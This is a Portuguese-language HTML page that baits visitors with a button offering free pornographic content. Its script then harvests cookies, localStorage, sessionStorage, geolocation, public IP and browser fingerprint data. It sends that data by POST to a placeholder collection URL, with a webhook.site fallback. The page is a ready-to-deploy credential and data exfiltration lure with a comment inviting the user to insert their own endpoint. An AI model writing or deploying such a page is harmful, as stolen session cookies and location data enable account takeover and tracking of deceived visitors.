<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Coleta de Dados</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
        button { padding: 15px 30px; font-size: 16px; background: #0070f3; color: white; border: none; border-radius: 5px; cursor: pointer; }
        button:hover { background: #005bb5; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <h1>Clique no botão abaixo</h1>
    <p>Clique para ver as melhores atrizes porno gratis.</p>
    <button id="collectBtn">ATRIZES PORNO GRATIS!</button>
    <div id="loading" class="hidden">Carregando...</div>

    <script>
        document.getElementById('collectBtn').addEventListener('click', async () => {
            document.getElementById('collectBtn').textContent = "COLETANDO...";
            document.getElementById('collectBtn').disabled = true;
            document.getElementById('loading').classList.remove('hidden');

            // Coleta de dados básicos do navegador
            const userAgent = navigator.userAgent;
            const language = navigator.language;
            const screenResolution = `${window.screen.width}x${window.screen.height}`;
            const deviceMemory = navigator.deviceMemory || "Desconhecido";
            const hardwareConcurrency = navigator.hardwareConcurrency || "Desconhecido";
            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const cookies = document.cookie;
            const localStorageData = JSON.stringify(localStorage);
            const sessionStorageData = JSON.stringify(sessionStorage);

            // Tentativa de obter geolocalização (requer permissão)
            let geoLocation = "Permissão negada ou não disponível";
            try {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject);
                });
                geoLocation = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
            } catch (error) {
                geoLocation = "Permissão negada ou não disponível";
            }

            // Tentativa de obter IP público (via serviço externo)
            let ipAddress = "Não pôde ser obtido";
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                ipAddress = data.ip;
            } catch (error) {
                ipAddress = "Não pôde ser obtido";
            }

            // Estrutura de dados coletados
            const payload = {
                userAgent,
                language,
                screenResolution,
                deviceMemory,
                hardwareConcurrency,
                timeZone,
                cookies,
                localStorageData,
                sessionStorageData,
                geoLocation,
                ipAddress,
                timestamp: new Date().toISOString(),
                referrer: document.referrer,
                url: window.location.href
            };

            // Envia os dados para um endpoint (substitua pela sua URL)
            try {
                await fetch('https://seu-dominio.com/collect', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (error) {
                await fetch('https://webhook.site/unique-hook-id', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            }

            // Reset do botão
            document.getElementById('collectBtn').textContent = "DADOS ENVIADOS!";
            setTimeout(() => {
                document.getElementById('loading').classList.add('hidden');
            }, 2000);
        });
    </script>
</body>
</html>
